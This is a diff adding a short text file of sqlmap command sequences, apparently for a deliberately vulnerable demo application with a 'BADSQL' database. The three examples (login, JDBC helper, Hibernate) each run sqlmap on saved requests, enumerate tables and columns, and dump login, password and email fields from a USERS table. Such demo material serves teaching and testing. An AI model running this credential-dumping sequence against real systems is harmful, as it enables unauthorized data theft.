@@ -1,0 +1,52 @@
+Example 1:
+----------
+
+./clean.sh
+python sqlmap.py -r login_badsql.txt
+
+python sqlmap.py -r login_badsql.txt --dbs
+
+python sqlmap.py -r login_badsql.txt -D BADSQL --tables
+
+python sqlmap.py -r login_badsql.txt -D BADSQL -T USERS --columns
+
+python sqlmap.py -r login_badsql.txt -D BADSQL -T USERS -C login,password,email --dump
+
+
+Example 2:
+----------
+
+./clean.sh
+python sqlmap.py -r sports_jdbchelper.txt
+
+python sqlmap.py -r sports_jdbchelper.txt --level 5 --risk 3
+
+
+./clean.sh
+python sqlmap.py -r multi_sports_jdbchelper.txt
+
+python sqlmap.py -r multi_sports_jdbchelper.txt -D BADSQL -T SPORTS --columns
+
+python sqlmap.py -r multi_sports_jdbchelper.txt -D BADSQL -T USERS -C login,password,email --dump
+
+
+Example 3:
+----------
+
+./clean.sh
+python sqlmap.py -r sports_hibernate.txt
+python sqlmap.py -r sports_hibernate.txt --level 5 -risk 3
+
+./clean.sh
+python sqlmap.py -r multi_sports_hibernate.txt
+
+python sqlmap.py -r multi_sports_jdbchelper.txt -D BADSQL -T SPORTS --columns
+
+python sqlmap.py -r multi_sports_jdbchelper.txt -D BADSQL -T USERS -C login,password,email --dump
+
+
+
+
+
+
+
